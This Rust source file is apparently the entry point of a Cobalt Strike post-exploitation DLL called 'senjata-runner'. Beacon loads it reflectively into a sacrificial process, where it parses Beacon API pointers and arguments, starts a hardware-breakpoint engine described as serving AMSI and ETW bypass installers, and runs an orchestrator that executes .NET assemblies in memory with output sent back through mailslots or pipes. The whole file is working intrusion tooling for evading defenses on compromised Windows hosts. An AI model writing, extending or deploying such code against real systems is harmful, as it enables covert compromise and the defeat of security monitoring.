//! senjata-runner — UDPK postex DLL. Reflectively loaded by Cobalt Strike
//! into a sacrificial process via `beacon_execute_postex_job`. Receives
//! the BeaconAPI function table and the orchestrator's input args, then
//! invokes `clr_orchestrator::orchestrate()`.
//!
//! Built as `cdylib` → produces a Windows DLL with a single named export
//! (`postex_main`) that CS calls.
#![no_std]
#![no_main]
#![cfg(target_os = "windows")]

extern crate alloc;

#[global_allocator]
static __ALLOC: rustbof::allocator::BeaconAlloc = rustbof::allocator::BeaconAlloc;

mod args;
mod beacon_api;
mod cleanup;
mod streamer;

#[cfg(not(test))]
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

/// CS UDPK entrypoint. The postex shellcode calls this after reflective DLL
/// load completes. `data` points at a CS-allocated blob whose layout is:
///   [BeaconAPI function pointer table][packed orchestrator args]
///
/// We're given the length; we split the blob and dispatch.
#[unsafe(no_mangle)]
pub unsafe extern "system" fn postex_main(data: *mut u8, len: i32) {
    unsafe {
        // 1. Resolve BeaconAPI from the head of the blob.
        let api = beacon_api::parse(data, len as usize);
        let (args_ptr, args_len) = beacon_api::args_blob(data, len as usize);

        // 2. Parse orchestrator args.
        let parsed = match args::parse(args_ptr as *mut core::ffi::c_void, args_len) {
            Ok(a) => a,
            Err(_e) => {
                api.output(beacon_api::CALLBACK_ERROR, b"[runner] args parse failed\n");
                cleanup::terminate_self();
            }
        };

        // 3. Init HWBP engine (used by orchestrator's bypass installers).
        let engine = match opsec_hwbp::HwbpEngine::init() {
            Ok(e) => e,
            Err(_) => {
                api.output(beacon_api::CALLBACK_ERROR, b"[runner] hwbp init failed\n");
                cleanup::terminate_self();
            }
        };

        // 4. Build OrchestrateInput borrowing from `parsed`.
        let input = clr_orchestrator::OrchestrateInput {
            app_domain: &parsed.app_domain,
            amsi: parsed.amsi,
            etw: parsed.etw,
            mailslot: parsed.mailslot,
            entry_point: parsed.entry_point,
            slot_name: &parsed.slot_name,
            pipe_name: &parsed.pipe_name,
            asm_args: &parsed.asm_args,
            mode: parsed.mode,
            main_name: &parsed.main_name,
            asm_bytes: &parsed.asm_bytes,
        };

        // 5. Run orchestrator. Streaming wiring done in Task 4.5.
        match clr_orchestrator::orchestrate(&input, &engine) {
            Ok(()) => api.output(beacon_api::CALLBACK_OUTPUT, b"[runner] done\n"),
            Err(e) => {
                let msg = e.format();
                api.output(beacon_api::CALLBACK_ERROR, msg.as_bytes());
                api.output(beacon_api::CALLBACK_ERROR, b"\n");
            }
        }

        // 6. Exit sacrificial.
        cleanup::terminate_self();
    }
}

#[unsafe(no_mangle)]
pub extern "system" fn DllMain(
    _module: *mut core::ffi::c_void,
    _reason: u32,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    1
}
